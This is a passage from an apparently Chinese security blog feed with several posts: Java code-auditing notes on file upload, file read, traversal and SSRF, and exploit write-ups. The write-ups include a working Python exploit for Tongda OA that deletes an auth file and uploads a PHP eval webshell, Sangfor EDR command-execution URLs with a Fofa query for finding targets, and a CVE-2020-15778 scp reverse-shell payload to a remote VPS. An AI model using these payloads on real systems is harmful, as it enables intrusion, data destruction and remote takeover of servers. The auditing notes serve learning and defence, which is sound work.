redirectAttributes.addFlashAttribute(<span class="string">"message"</span>,</span><br><span class="line">                    <span class="string">"You successfully uploaded '"</span> + UPLOADED_FOLDER + file.getOriginalFilename() + <span class="string">"'"</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            redirectAttributes.addFlashAttribute(<span class="string">"message"</span>, <span class="string">"upload failed"</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"redirect:/file/status"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"redirect:/file/status"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="审计函数"><a href="#审计函数" class="headerlink" title="审计函数"></a>审计函数</h2><p>java中文件操作的函数特别多，有的是原始的字节字符流</p><p>java都是基于流的，还有好多都是后面有封装的，感觉如果不熟就直接 搜索file吧，再检查 过滤条件</p><ol><li><p>JDK原始的java.io.FileInputStream</p></li><li><p>JDK原始的 BufferedOutputStream</p></li><li><p>JDK原始的各种OutputStream，流操作都可以</p></li><li><p>Apache Commons IO提供的org.apache.commons.io.FileUtils类</p></li></ol><p>参考园长文章</p><h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><ul><li>使用白名单校验上传文件类型、大小限制、MIME类型</li><li>白名单fileName.substring(fileName.lastIndexOf(“.”)); 检查后缀名</li><li>还有一个BufferedImage类、Image类、Graphics类这些封装好的图片类，直接传进去试试</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BufferedImage bi &#x3D; ImageIO.read(file);</span><br></pre></td></tr></table></figure><h1 id="0x02文件读取"><a href="#0x02文件读取" class="headerlink" title="0x02文件读取"></a>0x02文件读取</h1><h2 id="简述：-2"><a href="#简述：-2" class="headerlink" title="简述："></a>简述：</h2><p>Java其实读写是一体的，都是流的输入和输出</p><p>这个漏洞主要是要结合第一个，路径穿越的情况</p><h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span>(<span class="string">"/path_traversal/"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getImage</span><span class="params">(String filepath)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">File f = <span class="keyword">new</span> File(filepath);</span><br><span class="line"><span class="keyword">if</span> (f.exists() &amp;&amp; !f.isDirectory()) &#123;</span><br><span class="line"><span class="comment">//读取文件</span></span><br><span class="line">    <span class="keyword">byte</span>[] data = Files.readAllBytes(Paths.get(filepath));</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> String(Base64.encodeBase64(data));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"File doesn't exist or is not a file."</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="审计函数-1"><a href="#审计函数-1" class="headerlink" title="审计函数"></a>审计函数</h2><ol><li><p>JDK原始的java.io.RandomAccessFile类</p></li><li><p>JDK原始的inputsteam类</p></li><li><p>Apache Commons IO提供的org.apache.commons.io.FileUtils类</p></li><li><p>JDK1.7新增的基于NIO非阻塞异步读取文件的<code>java.nio.channels.AsynchronousFileChannel</code>类</p></li><li><p>JDK1.7新增的基于NIO读取文件的<code>java.nio.file.Files</code>类</p><p>常用方法如:<code>Files.readAllBytes</code>、<code>Files.readAllLines</code></p><p>参考园长文章</p></li></ol><h2 id="修复方案-1"><a href="#修复方案-1" class="headerlink" title="修复方案:"></a>修复方案:</h2><p>过滤目录穿越关键字</p><h1 id="0x01-目录遍历"><a href="#0x01-目录遍历" class="headerlink" title="0x01 目录遍历"></a>0x01 目录遍历</h1><h2 id="简述：-3"><a href="#简述：-3" class="headerlink" title="简述："></a>简述：</h2><p>目录遍历，主要看逻辑吧，能不能回显</p><p>有专门file.listFiles()函数可以处理。</p><h2 id="代码：-1"><a href="#代码：-1" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> file;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">filepath</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String path = <span class="string">"/Users/zy/Desktop/java_rmi/src/main/java/"</span>;<span class="comment">//要遍历的路径</span></span><br><span class="line">        File file = <span class="keyword">new</span> File(path);<span class="comment">//获取其file对象</span></span><br><span class="line">        func(file);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">func</span><span class="params">(File file)</span></span>&#123;</span><br><span class="line">        File[] fs = file.listFiles();</span><br><span class="line">        <span class="keyword">for</span>(File f:fs)&#123;</span><br><span class="line">            <span class="keyword">if</span>(f.isDirectory())<span class="comment">//若是目录，则递归打印该目录下的文件</span></span><br><span class="line">                func(f);</span><br><span class="line">            <span class="keyword">if</span>(f.isFile())<span class="comment">//若是文件，直接打印</span></span><br><span class="line">                System.out.println(f);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>通达OA 最新0day RCE 漏洞 附带EXP</title>
      <link href="/2020/08/19/%E9%80%9A%E8%BE%BEOA%20%E6%9C%80%E6%96%B00day%20RCE%20%E6%BC%8F%E6%B4%9E%20%E9%99%84%E5%B8%A6EXP/"/>
      <url>/2020/08/19/%E9%80%9A%E8%BE%BEOA%20%E6%9C%80%E6%96%B00day%20RCE%20%E6%BC%8F%E6%B4%9E%20%E9%99%84%E5%B8%A6EXP/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="通达OA-最新0day-RCE-漏洞"><a href="#通达OA-最新0day-RCE-漏洞" class="headerlink" title="通达OA 最新0day RCE 漏洞"></a>通达OA 最新0day RCE 漏洞</h1><p>此漏洞会删除文件 可能损坏OA系统<br>要有授权！别瞎搞和批量了</p><p>关注时间，老版本不行</p><p>11.6 版本可</p><p>具体影响范围自行测试</p><h1 id="亲测存在"><a href="#亲测存在" class="headerlink" title="亲测存在"></a>亲测存在</h1><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MTkxMjMyMjgucG5n?x-oss-process=image/format,png" alt="image-20200819123228685"></p><h1 id="exp利用脚本"><a href="#exp利用脚本" class="headerlink" title="exp利用脚本"></a>exp利用脚本</h1><p>来源于网络</p><p>禁止进行非法攻击</p><p>仅用于工作和学习,<em>禁止_用于_非法攻击</em>,非法传播</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">target=<span class="string">"http://127.0.0.1:8888/"</span></span><br><span class="line">payload=<span class="string">"&lt;?php eval($_POST['test']);?&gt;"</span></span><br><span class="line">print(<span class="string">"[*]Warning,This exploit code will DELETE auth.inc.php which may damage the OA"</span>)</span><br><span class="line">input(<span class="string">"Press enter to continue"</span>)</span><br><span class="line">print(<span class="string">"[*]Deleting auth.inc.php...."</span>)</span><br><span class="line"> </span><br><span class="line">url=target+<span class="string">"/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php"</span></span><br><span class="line">requests.get(url=url)</span><br><span class="line">print(<span class="string">"[*]Checking if file deleted..."</span>)</span><br><span class="line">url=target+<span class="string">"/inc/auth.inc.php"</span></span><br><span class="line">page=requests.get(url=url).text</span><br><span class="line"><span class="keyword">if</span> <span class="string">'No input file specified.'</span> <span class="keyword">not</span> <span class="keyword">in</span> page:</span><br><span class="line">    print(<span class="string">"[-]Failed to deleted auth.inc.php"</span>)</span><br><span class="line">    exit(<span class="number">-1</span>)</span><br><span class="line">print(<span class="string">"[+]Successfully deleted auth.inc.php!"</span>)</span><br><span class="line">print(<span class="string">"[*]Uploading payload..."</span>)</span><br><span class="line">url=target+<span class="string">"/general/data_center/utils/upload.php?action=upload&amp;filetype=nmsl&amp;repkid=/.&lt;&gt;./.&lt;&gt;./.&lt;&gt;./"</span></span><br><span class="line">files = &#123;<span class="string">'FILE1'</span>: (<span class="string">'test.php'</span>, payload)&#125;</span><br><span class="line">requests.post(url=url,files=files)</span><br><span class="line">url=target+<span class="string">"/_test.php"</span></span><br><span class="line">page=requests.get(url=url).text</span><br><span class="line"><span class="keyword">if</span> <span class="string">'No input file specified.'</span> <span class="keyword">not</span> <span class="keyword">in</span> page:</span><br><span class="line">    print(<span class="string">"[+]Filed Uploaded Successfully"</span>)</span><br><span class="line">    print(<span class="string">"[+]URL:"</span>,url)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"[-]Failed to upload file"</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>深信服 EDR终端检测响应平台 0day RCE 漏洞</title>
      <link href="/2020/08/17/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20EDR%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0%200day%20RCE%20%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/08/17/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20EDR%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0%200day%20RCE%20%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h1><p>深信服终端检测响应平台EDR，围绕终端资产安全生命周期，通过预防、防御、检测、响应赋予终端更为细致的隔离策略、更为精准的查杀能力、更为持续的检测能力、更为快速的处置能力。在应对高级威胁的同时，通过云网端联动协同、威胁情报共享、多层级响应机制，帮助用户快速处置终端安全问题，构建轻量级、智能化、响应快的下一代终端安全系统。</p><p>官网的原话。。。</p><h1 id="Fofa关键字："><a href="#Fofa关键字：" class="headerlink" title="Fofa关键字："></a><strong>Fofa关键字：</strong></h1><p>title=“终端检测响应平台”</p><p>界面：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MTcyMzI5MjYucG5n?x-oss-process=image/format,png" alt="image-20200817232926734"></p><h1 id="0x02-RCE-payload"><a href="#0x02-RCE-payload" class="headerlink" title="0x02 RCE payload"></a>0x02 RCE payload</h1><p><strong>漏洞位置：host 参数</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xxx.com:xxx&#x2F;tool&#x2F;log&#x2F;c.php?strip_slashes&#x3D;system&amp;host&#x3D;id</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MTcyMzMwNTMucG5n?x-oss-process=image/format,png" alt="image-20200817233053115"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xxx.com:xxx&#x2F;tool&#x2F;log&#x2F;c.php?strip_slashes&#x3D;system&amp;host&#x3D;pwd</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MTcyMzUxMDcucG5n?x-oss-process=image/format,png" alt="image-20200817235107599"></p><h1 id="0x03-处置建议"><a href="#0x03-处置建议" class="headerlink" title="0x03 处置建议"></a>0x03 处置建议</h1><p>目前官方未公布相关处置建议，临时处置可采取：</p><p>先下线吧，代码漏洞有点多。。<br>等更新</p>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-15778漏洞复现</title>
      <link href="/2020/08/03/CVE-2020-15778%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/08/03/CVE-2020-15778%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x01-漏洞简介"><a href="#0x01-漏洞简介" class="headerlink" title="0x01 漏洞简介"></a>0x01 漏洞简介</h1><p>SCP(secure copy)是linux系统下基于ssh登录进行安全远程文件拷贝的命令，可以在linux之间复制文件和目录。</p><p>OpenSSH中小于 8.3p1版本 SCP命令里存在命令注入漏洞。当将文件复制到远程服务器时，文件路径附加在本地scp命令的末尾，可以触发命令注入漏洞。</p><p>漏洞存在的点在 <a href="https://github.com/openssh/openssh-portable/blob/a2855c048b3f4b17d8787bd3f24232ec0cd79abe/scp.c#L989" target="_blank" rel="noopener">https://github.com/openssh/openssh-portable/blob/a2855c048b3f4b17d8787bd3f24232ec0cd79abe/scp.c#L989</a></p><p>攻击者可以采用反引号(`)文件作为命令注入执行scp命令，命令将会发送到远程服务器并执行。</p><p>作者介绍是</p><p>将文件复制到远程服务器时，文件路径会附加在本地scp命令的末尾。例如，如果执行以下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp SourceFile user@host:directory&#x2F;TargetFile</span><br></pre></td></tr></table></figure><p>它将执行本地命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -t directory&#x2F;TargetFile</span><br></pre></td></tr></table></figure><p>大佬的原帖<a href="https://github.com/cpandya2909/CVE-2020-15778/" target="_blank" rel="noopener">https://github.com/cpandya2909/CVE-2020-15778/</a></p><h1 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h1><p>version: &lt;=openssh-8.3p1</p><h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>靶机kali : 192.168.100.236</p><p>利用场景：已知 ssh 密码为 root</p><h2 id="查看当然版本和主机信息"><a href="#查看当然版本和主机信息" class="headerlink" title="查看当然版本和主机信息"></a>查看当然版本和主机信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -V &amp;&amp; ifconfig</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MDMxMDA0MzMucG5n?x-oss-process=image/format,png" alt="image-20200803100433615"></p><h2 id="正常连接拷贝一下，命令学习一下"><a href="#正常连接拷贝一下，命令学习一下" class="headerlink" title="正常连接拷贝一下，命令学习一下"></a>正常连接拷贝一下，命令学习一下</h2><p>攻击机：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp 本地文件 用户@远程IP：远程地址</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">scp ./config.yaml root@192.168.100.236:/root/zeo.yaml</span><br><span class="line"></span><br><span class="line"><span class="comment">#中途还是要身份验证，需要输入对应用户的密码</span></span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MDMxMDA3MTUucG5n?x-oss-process=image/format,png" alt="image-20200803100715320"></p><p>受害机：拷贝成功</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MDMxMDA4NDQucG5n?x-oss-process=image/format,png" alt="image-20200803100844527"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>攻击机：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">scp ./config.yaml root@192.168.100.236:<span class="string">'`touch /root/zeo_eval`/root/zeo2.yaml'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#’'`touch /root/zeo_eval`/root/zeo2.yaml' 单引号包裹全路径信息</span></span><br><span class="line"><span class="comment">#`touch /root/zeo_eval` 反引号包裹要执行的命令</span></span><br><span class="line"><span class="comment">#中途还是要身份验证，需要输入对应用户的密码</span></span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MDMxMDE1MzMucG5n?x-oss-process=image/format,png" alt="image-20200803101533314"></p><p>受害机：命令执行成功</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MDMxMDE4NDcucG5n?x-oss-process=image/format,png" alt="image-20200803101847532"></p><h2 id="反弹shell利用"><a href="#反弹shell利用" class="headerlink" title="反弹shell利用"></a>反弹shell利用</h2><p>VPS端：直接反弹加到payload里面发送，并开启nc监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">scp .&#x2F;config.yaml root@192.168.100.236:&#39;&#96;sh -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;110.110.110.110&#x2F;6666 0&gt;&amp;1</span><br><span class="line">&#96;&#x2F;root&#x2F;zeo3.yaml&#39;</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MDMxMTI0NTcucG5n?x-oss-process=image/format,png" alt=""></p><p>VPS接到bash</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MDMxMTIxNDEucG5n?x-oss-process=image/format,png" alt="image-20200803112141012"></p><h1 id="0x04-修复建议"><a href="#0x04-修复建议" class="headerlink" title="0x04 修复建议"></a>0x04 修复建议</h1><ul><li>等待官方补丁</li><li>保护好自己的密码，ssh认证</li></ul><h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h1><p>这个漏洞的利用还有点问题，因为还要bypass掉身份认证这个环节，才能远程命令执行，如果过了身份验证，那就牛逼大发了。</p><p>远程命令的执行，估计还得等大牛开发利用方式。</p>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>java代码审计自学:从爬虫到SSRF漏洞</title>
      <link href="/2020/07/31/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%87%AA%E5%AD%A6!%E4%BB%8E%E7%88%AC%E8%99%AB%E5%88%B0SSRF%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/07/31/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%87%AA%E5%AD%A6!%E4%BB%8E%E7%88%AC%E8%99%AB%E5%88%B0SSRF%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-前提"><a href="#0x00-前提" class="headerlink" title="0x00 前提"></a>0x00 前提</h1><p>主要是因为自己的学习Java 代码审计中的学习思路吧，主要自己一个人学习，有点闭门造车，百度学习法，但是还是记录一下，也分享一下，也便于将来的总结和反思，如果我能终能学到什么，我也会重新梳理思路，为那些自学者提供一个好的思路，所以有了下面的系列文章java代码审计自学篇。</p><p>这个是因为刚刚造轮子，学习了一下Java的GUI是怎么写的，造了一个轮子，要写一个爬虫，由于中间出现了小bug，看了看网络请求这块，后来发现顺便就是把SSRF这个漏洞就一起研究。</p><h1 id="0x01-SSRF漏洞"><a href="#0x01-SSRF漏洞" class="headerlink" title="0x01 SSRF漏洞"></a>0x01 SSRF漏洞</h1><p>SSRF(Server-Side Request Forge, 服务端请求伪造)，攻击者让服务端发起指定的请求，SSRF攻击的目标一般是从外网无法访问的内网系统。</p><p>这个不必多说了，直接copy吧</p><p>Java中的SSRF和PHP的有点区别：协议支持少一些，而且部分协议是受限的比如gopher协议，所以总体上来说Java的SSRF危害肯没PHP那么大。</p><p>通常 ssrf 容易出现的功能点，还是和php那些都一样：</p><p>基本上都是发起url请求的地方：</p><p>1、通过关键字 share、url、link、src、source、target、display、3g、target、domain、u</p><p>2、通过URL地址加载</p><p>3、下载图片、文章收藏功能</p><p>4、通过url 地址分享文章</p><h1 id="0x02-详情介绍"><a href="#0x02-详情介绍" class="headerlink" title="0x02 详情介绍"></a>0x02 详情介绍</h1><p>最开始是看到了URLConnection写的爬虫，后来发现这个算是比较原始的了，相当于直接请求出去，接受回来的字节码的流文件，没啥处理，直接接受，后面都得自己处理，比如 charset都得自己去匹配，要不又的是GBK有的是UTF-8的，写的好烦</p><h2 id="第一种：URLConnection-发起的请求"><a href="#第一种：URLConnection-发起的请求" class="headerlink" title="第一种：URLConnection 发起的请求"></a>第一种：URLConnection 发起的请求</h2><p>支撑的协议有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file ftp mailto http https jar netdoc gopher</span><br></pre></td></tr></table></figure><p>注意：</p><p><code>gopher</code> 实际在 jdk8 版本以后被阉割了，所以没有PHP那种SSRF那么牛逼了</p><p>先看一个简单的爬虫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.net.URLConnection;</span><br><span class="line"></span><br><span class="line">class URLConnectionDemo &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws IOException &#123;</span><br><span class="line"></span><br><span class="line">        URL url &#x3D; new URL(&quot;https:&#x2F;&#x2F;www.baidu.com&quot;);</span><br><span class="line">        &#x2F;&#x2F; 打开和url之间的连接</span><br><span class="line">        URLConnection connection &#x3D; url.openConnection();</span><br><span class="line">        &#x2F;&#x2F; 设置请求参数 键-通过该请求是已知的（例如，“关键字Accept ”）</span><br><span class="line">        connection.setRequestProperty(&quot;user-agent&quot;, &quot;Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;69.0.3497.100 Safari&#x2F;537.36&quot;);</span><br><span class="line">        &#x2F;&#x2F;设置指定的超时值</span><br><span class="line">        connection.setConnectTimeout(1000);</span><br><span class="line">        &#x2F;&#x2F;如果是写爬虫的话，最后加上，要不一直抛出异常重试，实测如果写特别影响效率，尤其是全网乱爬</span><br><span class="line">        &#x2F;&#x2F;将读超时设置为指定的超时，以毫秒为单位</span><br><span class="line">        connection.setReadTimeout(1000);</span><br><span class="line">        &#x2F;&#x2F; 建立实际连接</span><br><span class="line">        connection.connect();</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 获取响应头字段信息列表</span><br><span class="line">        connection.getHeaderFields();</span><br><span class="line">        System.out.println(connection.getHeaderFields());</span><br><span class="line"></span><br><span class="line">        StringBuilder response &#x3D; new StringBuilder();</span><br><span class="line">        &#x2F;&#x2F;获取流到缓冲区</span><br><span class="line">        BufferedReader in &#x3D; new BufferedReader(new InputStreamReader(connection.getInputStream()));</span><br><span class="line">        String line;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        while ((line &#x3D; in.readLine()) !&#x3D; null) &#123;</span><br><span class="line">            response.append(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.print(response.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1、URL 建立一个对象， 调用openConnection 来获取一个 URLConnection 的实例</p><p>2、然后设置各种请求参数以及一些配置</p><p>3、使用其中的 connect 方法来发起请求，用 getInputStream 来获请求的响应流</p><p>4、最后接收自行处理</p><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>如果 URL 是可控的，那么就会存在 SSRF 漏洞</p><p>如果中间存在这句话，就不能使用gopher协议， 因为到不了发起请求的连接之前就会抛出异常中断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">con.setRequestMethod(&quot;GET&quot;);</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>URL 是可控的，file协议读取etc/passwd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL url &#x3D; new URL(&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;);</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MzExNDA5MTkucG5n?x-oss-process=image/format,png" alt="image-20200731140914542"></p><h2 id="第二种：限制过的http请求"><a href="#第二种：限制过的http请求" class="headerlink" title="第二种：限制过的http请求"></a>第二种：限制过的http请求</h2><p>还有一些封装过的http请求，这些其实都做过限制，或者要换协议直接抛异常了，所以鸡肋一些</p><p>大概就只能做内网探测了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HttpClient.execute</span><br><span class="line">HttpClient.executeMethod</span><br><span class="line">HttpURLConnection.connect</span><br><span class="line">HttpURLConnection.getInputStream</span><br><span 